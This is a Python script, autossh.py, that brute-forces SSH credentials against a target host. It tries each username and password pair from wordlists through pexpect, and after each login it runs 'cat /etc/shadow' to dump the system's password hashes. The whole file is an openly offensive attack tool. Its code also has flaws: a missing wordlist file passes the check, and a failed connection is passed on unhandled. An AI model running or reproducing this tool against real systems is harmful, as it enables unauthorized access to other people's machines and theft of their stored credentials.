"""
BruteForce user credentials against a target

usage: python autossh.py <host> <user_filename> <pass_filename>

user_file has one username per line
pass_file has one potential password per line
"""
import pexpect
import os
import sys
import time

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_cmd(child, cmd):
    """
    Send commands to an SSH session
    :param child: SSH session
    :param cmd: Command String
    :return: Prints output from SSH session to console
    """
    child.sendline(cmd)
    child.expect(PROMPT)
    print('SSH session output\n')
    print(child.before)


def connect(user, host, passwd):
    """
    Takes a username, host and password. Establishes an SSH connection
    :param user: Username
    :param host: Host
    :param passwd: Password
    :return: SSH Connection
    """
    ssh_newkey = 'Are you sure you want to continue connecting'
    connstr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connstr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
        if ret == 0:
            print('Error Connecting')
            return
    child.sendline(passwd)
    child.expect(PROMPT)
    return child


def checkfile(filename):
    if not os.path.isfile(filename):
        print('{} deos not exist'.format(filename))
        return True
    elif not os.access(filename, os.R_OK):
        print('{} : Access Denied'.format(filename))
        return False
    else:
        return True


def main():
    if len(sys.argv) == 4:
        host = sys.argv[1]
        userfile = sys.argv[2]
        passfile = sys.argv[3]
        start_time = time.time()
        if checkfile(userfile) and checkfile(passfile):
            with open(userfile, 'r') as uf:
                for line in uf.readlines():
                    user = line.strip('\n')
                    with open(passfile, 'r') as pf:
                        for l in pf.readlines():
                            passwd = l.strip('\n')
                            child = connect(user, host, passwd)
                            send_cmd(child, 'cat /etc/shadow')
            print('Time Taken: {}'.format(time.time() - start_time))
        else:
            exit(1)
    else:
        print('usage: python autossh.py <host> <user_filename> <pass_filename>')
        exit(1)


if __name__ == '__main__':
    main()
